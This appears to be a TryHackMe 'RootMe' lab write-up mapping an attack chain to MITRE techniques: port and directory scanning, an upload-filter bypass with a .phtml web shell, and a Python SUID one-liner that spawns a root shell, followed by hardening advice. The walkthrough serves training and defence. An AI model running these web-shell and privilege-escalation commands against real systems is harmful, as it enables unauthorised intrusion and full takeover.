---
title: "TryHackMe Writeup: RootMe"
date: 2025-11-28
description: "Web application assessment involving bypass of upload restrictions and privilege escalation via SUID Python binary."
tags: ["tryhackme", "upload-bypass", "suid", "python", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

Security analysis based on the NIST SP 800-115 framework. The target exhibited an unrestricted file upload vulnerability in the `/panel` directory. By bypassing extension filters, a web shell was established. Privilege escalation was achieved by abusing a Python binary with an insecure SUID bit configuration.

### Attack Chain (PTES Mapping)

#### 1. Reconnaissance & Enumeration
Service discovery and directory brute-forcing revealed an upload panel.
```bash
sudo nmap -sS -sV -T4 -O 10.65.158.29
gobuster dir -u [http://10.65.158.29/](http://10.65.158.29/) -w /usr/share/wordlists/dirb/common.txt
```
* **MITRE Technique:** [T1083](https://attack.mitre.org/techniques/T1083/) - File and Directory Discovery.

#### 2. Exploitation
The upload filter was bypassed by renaming the payload to `.phtml`. Accessing the file in the `/uploads` directory triggered the reverse shell.
```bash
# Payload execution via URL:
[http://10.65.158.29/uploads/shell.phtml?cmd=](http://10.65.158.29/uploads/shell.phtml?cmd=)<python_reverse_shell_payload>
```
* **MITRE Technique:** [T1505.003](https://attack.mitre.org/techniques/T1505/003/) - Server Software Component: Web Shell.

#### 3. Post-Exploitation (Privilege Escalation)
Enumeration for SUID binaries identified `/usr/bin/python2.7`.
```bash
find / -perm -4000 -type f 2>/dev/null
```
The Python binary was used to spawn a root shell by setting the UID to 0:
```bash
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```
* **MITRE Technique:** [T1548.001](https://attack.mitre.org/techniques/T1548/001/) - Abuse Elevation Control Mechanism: Setuid and Setgid.

### Recommendations (NIST SP 800-115)

* **Input Validation:** Implement server-side file type validation using MIME-type checking and rename uploaded files to random strings.
* **Least Privilege:** Remove the SUID bit from interpreters like Python, Ruby, or Perl (`chmod -s /usr/bin/python2.7`).
* **Web Hardening:** Disable script execution in the `/uploads` directory via `.htaccess` or server configuration.